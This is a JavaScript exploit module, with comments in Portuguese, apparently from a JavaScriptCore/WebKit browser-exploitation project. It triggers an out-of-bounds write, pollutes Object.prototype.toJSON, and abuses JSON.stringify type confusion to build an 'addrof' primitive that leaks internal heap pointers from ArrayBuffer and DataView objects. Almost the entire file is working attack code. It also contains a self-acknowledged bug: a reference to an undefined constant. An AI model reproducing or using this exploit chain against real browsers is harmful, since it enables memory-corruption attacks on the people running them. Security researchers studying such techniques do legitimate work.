// js/script3/testArrayBufferVictimCrash.mjs (v54_SelfRefThenLeak)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V54_SRTL = "OriginalHeisenbug_TypedArrayAddrof_v54_SelfRefThenLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let leak_target_buffer_v54 = null; // Alvo para payload_A_ab
let leak_target_dataview_v54 = null; // Alvo para payload_B_dv

// Estes são para a tentativa de conversão numérica direta
let object_for_direct_conv_A_v54 = null;
let object_for_direct_conv_B_v54 = null;


let victim_typed_array_ref_v54 = null;
let probe_call_count_v54 = 0;
let all_probe_interaction_details_v54 = [];
let first_call_details_object_ref_v54 = null; // Referência ao C1_details

const PROBE_CALL_LIMIT_V54 = 10;

function toJSON_TA_Probe_SelfRefThenLeak_v54() {
    probe_call_count_v54++;
    const call_num = probe_call_count_v54;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v54_SelfRefThenLeak",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v54),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v54 && first_call_details_object_ref_v54 !== null),
        payload_AB_assigned_to_C1: false,
        payload_DV_assigned_to_C1: false,
        direct_numeric_leak_A_val: null,
        direct_numeric_leak_B_val: null,
        typed_array_read_leak_val: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V54) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v54.push(current_call_details);
            return { recursion_stopped_v54: true, call: call_num };
        }

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating C1_details.`, "info");
            first_call_details_object_ref_v54 = current_call_details; // Guarda a REFERÊNCIA
            current_call_details.self_ref_to_force_visit = current_call_details; // Adiciona auto-referência (como na v50) [cite: 1470]
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Added self_ref_to_force_visit to C1_details.`, "info");
            all_probe_interaction_details_v54.push(current_call_details);
            return current_call_details; // Retorna C1_details
        }
        // Caso 2: 'this' é o C1_details (type-confused) - Esperado na Call #2
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Attempting leaks...`, "vuln");

            // Estratégia 1: Atribuir TypedArrays como payloads
            if (leak_target_buffer_v54) {
                this.payload_A_ab = leak_target_buffer_v54;
                current_call_details.payload_AB_assigned_to_C1 = true;
            }
            if (leak_target_dataview_v54) {
                this.payload_B_dv = leak_target_dataview_v54;
                current_call_details.payload_DV_assigned_to_C1 = true;
            }

            // Estratégia 2: Tentar conversão numérica direta usando os objetos simples
            if (object_for_direct_conv_A_v54) {
                try {
                    let temp_arr = new Float64Array(1);
                    temp_arr[0] = object_for_direct_conv_A_v54;
                    this.leaked_addr_A_direct = temp_arr[0]; // Pode ser NaN
                    current_call_details.direct_numeric_leak_A_val = this.leaked_addr_A_direct;
                } catch (e) { current_call_details.direct_numeric_leak_A_val = `Error: ${e.message}`; }
            }
            if (object_for_direct_conv_B_v54) {
                 try {
                    let temp_arr = new Float64Array(1);
                    temp_arr[0] = object_for_direct_conv_B_v54;
                    this.leaked_addr_B_direct = temp_arr[0]; // Pode ser NaN
                    current_call_details.direct_numeric_leak_B_val = this.leaked_addr_B_direct;
                } catch (e) { current_call_details.direct_numeric_leak_B_val = `Error: ${e.message}`; }
            }
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: C1_details modified (assigned TypedArrays and attempted direct numeric conv). Keys: ${Object.keys(this).join(',')}`, "info");
            all_probe_interaction_details_v54.push(current_call_details);
            return this; // Retorna C1_details modificado
        }
        // Caso 3: 'this' é um ArrayBuffer ou DataView injetado (payload do C1_details)
        else if ( (this === leak_target_buffer_v54 && current_call_details.this_type === '[object ArrayBuffer]') ||
                  (this === leak_target_dataview_v54 && current_call_details.this_type === '[object DataView]') ) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE INJECTED ${current_call_details.this_type}! Attempting to read internal pointer...`, "critical");
            let leaked_val = null;
            try {
                let view_on_this_target = (current_call_details.this_type === '[object ArrayBuffer]') ? new DataView(this) : this;
                const offset_to_read = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET; // 0x10
                if (view_on_this_target.byteLength < (offset_to_read + 8)) {
                    throw new RangeError(`Target object too small (${view_on_this_target.byteLength} bytes) to read 8 bytes from offset ${toHex(offset_to_read)}.`);
                }
                let low = view_on_this_target.getUint32(offset_to_read, true);
                let high = view_on_this_target.getUint32(offset_to_read + 4, true);
                let int64_val = new AdvancedInt64(low, high);
                // Converter para Float64 para serialização JSON
                let temp_buffer = new ArrayBuffer(8); (new Uint32Array(temp_buffer))[0] = int64_val.low(); (new Uint32Array(temp_buffer))[1] = int64_val.high();
                leaked_val = (new Float64Array(temp_buffer))[0];

                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Read from 'this' (${current_call_details.this_type}) at offset ${toHex(offset_to_read)}. Leaked: ${int64_val.toString(true)} (as double: ${leaked_val})`, "vuln");
                current_call_details.typed_array_read_leak_val = leaked_val;
                all_probe_interaction_details_v54.push(current_call_details);
                return { leaked_address_v54: leaked_val, leaked_obj_type: current_call_details.this_type, from_offset: toHex(offset_to_read) };
            } catch (e_leak) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR during pointer extraction from injected ${current_call_details.this_type}: ${e_leak.name} - ${e_leak.message}`, "error");
                current_call_details.error_in_probe = e_leak.message;
                all_probe_interaction_details_v54.push(current_call_details);
                return { addrof_error_v54: e_leak.message, type: current_call_details.this_type };
            }
        }
        // Caso 4: 'this' é um [object Object] genérico (não C1_details)
        else if (current_call_details.this_type === '[object Object]') {
             logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an UNEXPECTED [object Object]. Assigning payloads to it as fallback.`, "warn");
            // Fallback: Tentar atribuir os objetos de leak simples
            if (object_for_direct_conv_A_v54) this.payload_A_fallback = object_for_direct_conv_A_v54;
            if (object_for_direct_conv_B_v54) this.payload_B_fallback = object_for_direct_conv_B_v54;
            all_probe_interaction_details_v54.push(current_call_details);
            return this;
        }
        // Caso 5: Outros tipos
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected type: ${current_call_details.this_type}.`, "warn");
            all_probe_interaction_details_v54.push(current_call_details);
            return { generic_marker_v54: call_num };
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
        const FNAME_CURRENT_TEST_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP; // Erro meu, deveria ser V54_SRTL
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: CRITICAL ERROR in probe: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST_REF);
        all_probe_interaction_details_v54.push(current_call_details);
        return { error_marker_v54: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_SelfRefThenLeak() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V54_SRTL}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (SelfRefThenLeak) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V54_SRTL} Init...`;

    probe_call_count_v54 = 0;
    all_probe_interaction_details_v54 = [];
    victim_typed_array_ref_v54 = null;
    first_call_details_object_ref_v54 = null;

    leak_target_buffer_v54 = new ArrayBuffer(0x70); // Tamanho aumentado para leitura de offset
    leak_target_dataview_v54 = new DataView(new ArrayBuffer(0x70));
    object_for_direct_conv_A_v54 = { marker_A_v54: "DirectConvA", idA: Date.now() };
    object_for_direct_conv_B_v54 = { marker_B_v54: "DirectConvB", idB: Date.now() + 1 };


    let errorCapturedMain = null;
    let rawStringifyOutput = null;
    let stringifyOutput_parsed = null;

    let addrof_A_result = { success: false, msg: "Addrof A: Default (v54)" };
    let addrof_B_result = { success: false, msg: "Addrof B: Default (v54)" };
    const fillPattern = 0.54545454545454;

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v54 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        // Preenchimento não é crítico, mas mantido
        // ...

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_SelfRefThenLeak_v54, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v54)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v54);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Expected if circular. Output: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            let heisenbugOnC1 = false;
            const call2Details = all_probe_interaction_details_v54.find(d => d.call_number === 2 && d.this_is_C1_details_obj);
            if (call2Details && (call2Details.payload_AB_assigned_to_C1 || call2Details.direct_numeric_leak_A_val !== null)) {
                heisenbugOnC1 = true;
                logS3(`  EXECUTE: HEISENBUG on C1_details (Call #2) & MODIFICATION ATTEMPT CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug on C1_details (Call #2) or modification attempt NOT confirmed.`, "error", FNAME_CURRENT_TEST);
            }

            logS3("STEP 3: Checking for leaked addresses (v54)...", "warn", FNAME_CURRENT_TEST);

            // Prioridade 1: Leitura direta de TypedArray/ArrayBuffer (Caso 3 da sonda, serializado)
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.leaked_address_v54 !== undefined) {
                const leaked_addr_val = stringifyOutput_parsed.leaked_address_v54;
                logS3(`  V54_ANALYSIS: Found 'leaked_address_v54' in stringifyOutput. Type: ${stringifyOutput_parsed.leaked_obj_type}, From Offset: ${stringifyOutput_parsed.from_offset}`, "good");
                if (typeof leaked_addr_val === 'number' && !isNaN(leaked_addr_val) && leaked_addr_val !== 0) {
                    let p_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[0], new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[1]);
                    if (p_int64.high() > 0x70000000 || p_int64.low() > 0x10000000 || (p_int64.high() & 0xFF000000) === 0x80000000) {
                        const target = stringifyOutput_parsed.leaked_obj_type === '[object ArrayBuffer]' ? addrof_A_result : addrof_B_result;
                        target.success = true; target.msg = `V54 SUCCESS (Direct TypedArray Read): ${p_int64.toString(true)} from ${stringifyOutput_parsed.from_offset}`;
                    } else { addrof_A_result.msg = `V54 DirectRead num but not ptr: ${p_int64.toString(true)}`; }
                } else { addrof_A_result.msg = `V54 DirectRead value not useful num: ${JSON.stringify(leaked_addr_val)}`; }
            }
            // Prioridade 2: Vazamento numérico direto do C1_details (leaked_addr_A/B_direct)
            else if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' &&
                     stringifyOutput_parsed.call_number === 1 && // Garante que é o C1_details
                     (stringifyOutput_parsed.leaked_addr_A_direct !== undefined || stringifyOutput_parsed.leaked_addr_B_direct !== undefined) ) {
                logS3(`  V54_ANALYSIS: Found 'leaked_addr_A/B_direct' in stringifyOutput (C1_details).`, "good");
                const leak_A_direct = stringifyOutput_parsed.leaked_addr_A_direct;
                if (typeof leak_A_direct === 'number' && !isNaN(leak_A_direct) && leak_A_direct !== 0) {
                    let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leak_A_direct]).buffer)[0], new Uint32Array(new Float64Array([leak_A_direct]).buffer)[1]);
                    if (pA_int64.high() > 0x70000000 || pA_int64.low() > 0x10000000 || (pA_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_A_result.success = true; addrof_A_result.msg = `V54 SUCCESS (Direct Numeric Conv A): ${pA_int64.toString(true)}`;
                    } else { addrof_A_result.msg = `V54 DirectConv A num but not ptr: ${pA_int64.toString(true)}`; }
                } else { addrof_A_result.msg = `V54 DirectConv A value not useful num: ${JSON.stringify(leak_A_direct)}`; }

                const leak_B_direct = stringifyOutput_parsed.leaked_addr_B_direct;
                if (typeof leak_B_direct === 'number' && !isNaN(leak_B_direct) && leak_B_direct !== 0) {
                    let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leak_B_direct]).buffer)[0], new Uint32Array(new Float64Array([leak_B_direct]).buffer)[1]);
                     if (pB_int64.high() > 0x70000000 || pB_int64.low() > 0x10000000 || (pB_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_B_result.success = true; addrof_B_result.msg = `V54 SUCCESS (Direct Numeric Conv B): ${pB_int64.toString(true)}`;
                    } else { addrof_B_result.msg = `V54 DirectConv B num but not ptr: ${pB_int64.toString(true)}`; }
                } else { addrof_B_result.msg = `V54 DirectConv B value not useful num: ${JSON.stringify(leak_B_direct)}`; }
            }
            // Prioridade 3: Se houve erro de circularidade, tentar analisar o C1_details em memória
            else if (stringifyOutput_parsed && stringifyOutput_parsed.parse_error && rawStringifyOutput.includes("circular structure") && first_call_details_object_ref_v54) {
                logS3(`  V54_ANALYSIS: Circular structure error. Analyzing C1_details directly from memory.`, "warn");
                const c1_direct = first_call_details_object_ref_v54;
                const leak_A_direct_mem = c1_direct.leaked_addr_A_direct;
                 if (typeof leak_A_direct_mem === 'number' && !isNaN(leak_A_direct_mem) && leak_A_direct_mem !== 0) {
                    let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leak_A_direct_mem]).buffer)[0], new Uint32Array(new Float64Array([leak_A_direct_mem]).buffer)[1]);
                    if (pA_int64.high() > 0x70000000 || pA_int64.low() > 0x10000000 || (pA_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_A_result.success = true; addrof_A_result.msg = `V54 SUCCESS (Memory Direct Numeric Conv A): ${pA_int64.toString(true)}`;
                    } else { addrof_A_result.msg = `V54 MemDirectConv A num but not ptr: ${pA_int64.toString(true)}`; }
                } else { addrof_A_result.msg = `V54 MemDirectConv A value not useful num: ${JSON.stringify(leak_A_direct_mem)}`; }
                // Similar para B
            } else {
                if (!addrof_A_result.success) addrof_A_result.msg = "V54 No suitable addrof data found.";
                if (!addrof_B_result.success) addrof_B_result.msg = "V54 No suitable addrof data found.";
            }

            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V54_SRTL}: Addr SUCCESS!`;
            } else if (heisenbugOnC1) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V54_SRTL}: C1_TC OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V54_SRTL}: No C1_TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V54_SRTL}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V54_SRTL} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v54}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v54 = null;
        all_probe_interaction_details_v54 = [];
        probe_call_count_v54 = 0;
        first_call_details_object_ref_v54 = null;
        leak_target_buffer_v54 = null;
        leak_target_dataview_v54 = null;
        object_for_direct_conv_A_v54 = null;
        object_for_direct_conv_B_v54 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError',
        stringifyResult: stringifyOutput_parsed, // O resultado parseado, pode ser um erro se houve circularidade
        rawStringifyForAnalysis: rawStringifyOutput, // A string bruta para análise manual se necessário
        firstCallDetailsRefDirect: first_call_details_object_ref_v54, // Referência direta ao C1 para análise em caso de erro de stringify
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v54],
        total_probe_calls: probe_call_count_v54,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
};
